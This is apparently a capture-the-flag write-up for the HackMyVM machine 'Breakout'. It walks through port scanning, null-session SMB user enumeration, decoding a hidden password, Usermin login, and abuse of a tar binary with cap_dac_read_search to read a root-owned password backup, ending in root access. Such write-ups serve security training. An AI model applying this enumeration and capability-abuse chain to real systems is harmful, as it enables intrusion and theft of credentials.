# Breakout

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Breakout | icex64 | Beginner | HackMyVM |

**Summary:** Breakout is a beginner-level Linux machine hosted on HackMyVM. The attack begins with an Nmap port scan revealing five open services: Apache HTTP (port 80), Samba SMB (ports 139/445), Webmin (port 10000), and Usermin (port 20000). The Apache default page hides a Brainfuck-encoded password inside an HTML comment in the page source. Decoding the Brainfuck string with dCode yields a cleartext password. Simultaneously, running enum4linux against the Samba service enumerates a local Unix user named `cyber` via RID cycling. With the credentials `cyber:.2uqPEfj3D<P'a-3`, we authenticate to the Usermin panel on port 20000 and launch an interactive terminal session from within the web UI. Post-login enumeration with `getcap` reveals that a copy of the `tar` binary in the user's home directory has the `cap_dac_read_search` Linux capability set, effectively granting it the ability to read any file on the system regardless of standard permission checks. Exploiting this capability, we use `tar` to archive and extract `/var/backups/.old_pass.bak`, a hidden, root-owned backup file that contains the root account's old password `Ts&4&YurgtRX(=~h`. That password is then used to authenticate to the Webmin panel on port 10000 as root, granting a fully privileged shell and access to both the user and root flags.

---

## Reconnaissance

### Host Discovery

The target machine was identified on the local network using a custom PowerShell scanning script. The scan revealed a VirtualBox VM at `192.168.100.145`.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.145 08:00:27:FF:EC:57 VirtualBox
```

### Port Scan

A full TCP port scan with service and script detection was launched against the target to enumerate all running services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/breakout]
└─$ nmap -sC -sV -p- -T4 192.168.100.145
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-06 07:22 WIB
Nmap scan report for 192.168.100.145
Host is up (0.0055s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-server-header: MiniServ/1.830
|_http-title: 200 &mdash; Document follows

Host script results:
|_clock-skew: 6h59m57s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-03-06T07:23:06
|_  start_date: N/A
|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.57 seconds
```

The scan surfaces five interesting services:

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 80/tcp | Apache HTTP | 2.4.51 (Debian) | Default Debian page |
| 139/tcp | Samba SMB | 4.x | NetBIOS session service |
| 445/tcp | Samba SMB | 4.x | SMB over TCP |
| 10000/tcp | Webmin | MiniServ 1.981 | Administrator-level web panel |
| 20000/tcp | Usermin | MiniServ 1.830 | User-level web panel |

### Web Server Enumeration (Port 80)

The Apache web server on port 80 serves a standard Debian default page. However, a full `curl` of the response body reveals a suspicious HTML comment hidden at the bottom of the source code.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/breakout]
└─$ curl -i http://192.168.100.145/
HTTP/1.1 200 OK
Date: Fri, 06 Mar 2026 07:25:33 GMT
Server: Apache/2.4.51 (Debian)
Last-Modified: Tue, 19 Oct 2021 18:52:00 GMT
ETag: "2b97-5ceb92813c1ab"
Accept-Ranges: bytes
Content-Length: 11159
Vary: Accept-Encoding
Content-Type: text/html


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Debian Default Page: It works</title>
    <style type="text/css" media="screen">
  * {
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  }
...

<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.


-->
```

The comment contains a string of `+`, `-`, `>`, `<`, `.`, and `[`, `]` characters, which is immediately recognizable as **Brainfuck**, an esoteric programming language. The developer left a false sense of security by calling it "encrypted." The comment reads *"don't worry no one will get here, it's safe to share with you my access."* — strongly implying this encodes a password.

### Brainfuck Decoding

The Brainfuck string was decoded using the dCode online interpreter at `dcode.fr`. The interpreter executed the program and produced cleartext output.

![](image-1.png)

As visible in the dCode results panel, the decoded output is:

```
.2uqPEfj3D<P'a-3
```

This is the password for the `cyber` user.

### SMB Enumeration

With Samba exposed on ports 139 and 445, `enum4linux` was used to perform a full enumeration of shares, users, groups, and domain information via null session authentication.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/breakout]
└─$ enum4linux -a 192.168.100.145
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Mar  6 10:23:15 2026

 =========================================( Target Information )=========================================

Target ........... 192.168.100.145
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==========================( Enumerating Workgroup/Domain on 192.168.100.145 )==========================


[+] Got domain/workgroup name: WORKGROUP


 ==============================( Nbtstat Information for 192.168.100.145 )==============================

Looking up status of 192.168.100.145
        BREAKOUT        <00> -         B <ACTIVE>  Workstation Service
        BREAKOUT        <03> -         B <ACTIVE>  Messenger Service
        BREAKOUT        <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ==================================( Session Check on 192.168.100.145 )==================================


[+] Server 192.168.100.145 allows sessions using username '', password ''


 ===============================( Getting domain SID for 192.168.100.145 )===============================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 =================================( OS information on 192.168.100.145 )=================================


[E] Can't get OS info with smbclient


[+] Got OS info for 192.168.100.145 from srvinfo:
        BREAKOUT       Wk Sv PrQ Unx NT SNT Samba 4.13.5-Debian
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ======================================( Users on 192.168.100.145 )======================================

Use of uninitialized value $users in print at ./enum4linux.pl line 972.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 ================================( Share Enumeration on 192.168.100.145 )================================

smbXcli_negprot_smb1_done: No compatible protocol selected by server.

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.13.5-Debian)
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 192.168.100.145 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.100.145

//192.168.100.145/print$        Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//192.168.100.145/IPC$  Mapping: N/A Listing: N/A Writing: N/A

 ==========================( Password Policy Information for 192.168.100.145 )==========================

Password:


[+] Attaching to 192.168.100.145 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] BREAKOUT
        [+] Builtin

[+] Password Info for Domain: BREAKOUT

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 136 years 37 days 6 hours 21 minutes
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 136 years 37 days 6 hours 21 minutes



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 5


 =====================================( Groups on 192.168.100.145 )=====================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 =================( Users on 192.168.100.145 via RID cycling (RIDS: 500-550,1000-1050) )=================


[I] Found new SID:
S-1-22-1

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\cyber (Local User)

[+] Enumerating users using SID S-1-5-21-1683874020-4104641535-3793993001 and logon username '', password ''

S-1-5-21-1683874020-4104641535-3793993001-501 BREAKOUT\nobody (Local User)
S-1-5-21-1683874020-4104641535-3793993001-513 BREAKOUT\None (Domain Group)

 ==============================( Getting printer info for 192.168.100.145 )==============================

No printers returned.


enum4linux complete on Fri Mar  6 10:23:42 2026
```

The RID cycling phase is particularly valuable. Under SID `S-1-22-1` (the Unix user namespace), enum4linux successfully enumerated the local account:

```
S-1-22-1-1000 Unix User\cyber (Local User)
```

This gives us a confirmed local username: **cyber**.

---

## Initial Access

### Usermin Login (Port 20000)

With the username `cyber` from SMB enumeration and the decoded Brainfuck password `.2uqPEfj3D<P'a-3`, we navigated to the **Usermin** panel at `https://192.168.100.145:20000/`. Usermin is a web-based interface for Unix user-level tasks, distinct from the administrator-facing Webmin.

![](image.png)

Authentication was performed using the credentials `cyber` / `.2uqPEfj3D<P'a-3`. The login succeeded and dropped us into the Usermin dashboard. The top navigation bar confirmed the session was authenticated as the `cyber` user.

![](image-2.png)

The Usermin toolbar displays several icons including a terminal emulator icon (`>_`). Clicking this icon opens an interactive shell session running as the `cyber` user directly within the browser — no SSH or reverse shell required.

### Shell Access via Usermin Terminal

Once the terminal was launched from the Usermin interface, basic enumeration confirmed the session context:

```bash
[cyber@breakout ~]$ id
uid=1000(cyber) gid=1000(cyber) groups=1000(cyber),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
[cyber@breakout ~]$ ls -la
total 568
drwxr-xr-x  8 cyber cyber   4096 Oct 20  2021 .
drwxr-xr-x  3 root  root    4096 Oct 19  2021 ..
-rw-------  1 cyber cyber      0 Oct 20  2021 .bash_history
-rw-r--r--  1 cyber cyber    220 Oct 19  2021 .bash_logout
-rw-r--r--  1 cyber cyber   3526 Oct 19  2021 .bashrc
drwxr-xr-x  2 cyber cyber   4096 Oct 19  2021 .filemin
drwx------  2 cyber cyber   4096 Oct 19  2021 .gnupg
drwxr-xr-x  3 cyber cyber   4096 Oct 19  2021 .local
-rw-r--r--  1 cyber cyber    807 Oct 19  2021 .profile
drwx------  2 cyber cyber   4096 Oct 19  2021 .spamassassin
-rwxr-xr-x  1 root  root  531928 Oct 19  2021 tar
drwxr-xr-x  2 cyber cyber   4096 Oct 20  2021 .tmp
drwx------ 17 cyber cyber   4096 Mar  6 05:33 .usermin
-rw-r--r--  1 cyber cyber     48 Oct 19  2021 user.txt
```

The home directory listing immediately reveals two interesting items. First, `user.txt` is present and readable. Second, there is a binary named `tar` owned by root with world-execute permissions (`-rwxr-xr-x`) sitting directly in the home directory — an unusual placement that warrants further investigation.

---

## Privilege Escalation

### Linux Capabilities Enumeration

Linux capabilities are a fine-grained privilege control mechanism that can grant specific elevated powers to executables without making them full SUID binaries. Enumerating capabilities across the entire filesystem is a critical post-exploitation step.

```bash
[cyber@breakout ~]$ /usr/sbin/getcap -r / 2>/dev/null
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

The output confirms the suspicion raised by the home directory listing:

```
/home/cyber/tar cap_dac_read_search=ep
```

The `cap_dac_read_search` capability allows the binary to **bypass all Discretionary Access Control (DAC) read permission checks and directory search permission checks**. In practical terms, `/home/cyber/tar` can read **any file on the system**, including files owned by root that are mode `600` or `000`. The `=ep` flags indicate the capability is set as both Effective and Permitted, meaning it is active immediately upon execution.

### Identifying the Target File

The `/var/backups` directory was checked for sensitive files:

```bash
[cyber@breakout ~]$ ls -la /var/backups
total 28
drwxr-xr-x  2 root root  4096 Mar  6 03:21 .
drwxr-xr-x 14 root root  4096 Oct 19  2021 ..
-rw-r--r--  1 root root 12732 Oct 19  2021 apt.extended_states.0
-rw-------  1 root root    17 Oct 20  2021 .old_pass.bak
```

A hidden file `.old_pass.bak` is present, owned by root with permissions `600` (read/write for owner only). This is completely unreadable by the `cyber` user under normal circumstances. However, because `/home/cyber/tar` carries `cap_dac_read_search`, it can bypass this restriction.

### Exploiting `cap_dac_read_search` with Custom tar

The capability-enabled `tar` binary was used to create an archive of the protected file, then extract it locally where `cyber` can read the contents:

```bash
[cyber@breakout ~]$ ./tar -cvf password.tar /var/backups/.old_pass.bak
./tar: Removing leading `/' from member names
/var/backups/.old_pass.bak
[cyber@breakout ~]$ tar -xf password.tar
[cyber@breakout ~]$ cat var/backups/.old_pass.bak
Ts&4&YurgtRX(=~h
```

The backup file contains a single line: `Ts&4&YurgtRX(=~h` — the **old root password**.

### Root Access via Webmin (Port 10000)

With the recovered password, we navigated to the **Webmin** panel at `https://192.168.100.145:10000/`. Webmin is the administrator-facing counterpart to Usermin, running MiniServ 1.981.

![](image-3.png)

Authentication was attempted using `root` / `Ts&4&YurgtRX(=~h`. The login succeeded, granting full administrative access to the Webmin interface. Using the Webmin terminal, a root shell was obtained:

```bash
[root@breakout ~]# id
uid=0(root) gid=0(root) groups=0(root)
[root@breakout ~]# whoami
root
[root@breakout ~]# hostname
breakout
[root@breakout ~]# cat /home/cyber/user.txt
3mp!r3{You[REDACTED]}
[root@breakout ~]# cat /root/rOOt.txt
3mp!r3{You[REDACTED]}
```

Both the user flag at `/home/cyber/user.txt` and the root flag at `/root/rOOt.txt` were successfully captured, completing the machine.

---

## Attack Chain Summary

1. **Reconnaissance**: Full TCP port scan with `nmap -sC -sV -p- -T4` revealed five open services on `192.168.100.145`: Apache HTTP on port 80, Samba SMB on ports 139/445, Webmin MiniServ 1.981 on port 10000, and Usermin MiniServ 1.830 on port 20000. The NetBIOS hostname was identified as `BREAKOUT` running Samba 4.13.5-Debian.

2. **Vulnerability Discovery**: Fetching the Apache default page with `curl` exposed a hidden HTML comment containing a Brainfuck-encoded string. Decoding the string on dCode produced the plaintext password `.2uqPEfj3D<P'a-3`. Concurrently, `enum4linux -a` performed null-session enumeration against Samba and used RID cycling under SID `S-1-22-1` to enumerate the local Unix user account `cyber`.

3. **Exploitation**: The credentials `cyber:.2uqPEfj3D<P'a-3` were used to authenticate to the Usermin web panel on port 20000. The built-in Usermin terminal icon (`>_`) in the navigation bar provided an interactive shell session as the `cyber` user without requiring any network-level exploit.

4. **Internal Enumeration**: Post-login enumeration with `/usr/sbin/getcap -r / 2>/dev/null` revealed that `/home/cyber/tar` held the `cap_dac_read_search=ep` Linux capability. Listing `/var/backups` uncovered a hidden root-owned file `.old_pass.bak` with restrictive `600` permissions. Because `cap_dac_read_search` bypasses all DAC read checks, the capability-enabled `tar` binary could archive and exfiltrate the protected file, revealing the password `Ts&4&YurgtRX(=~h`.

5. **Privilege Escalation**: The recovered password was used to log into the Webmin administrator panel on port 10000 as `root`. The Webmin terminal spawned a root shell (`uid=0(root)`), enabling retrieval of the user flag from `/home/cyber/user.txt` and the root flag from `/root/rOOt.txt`, fully compromising the machine.
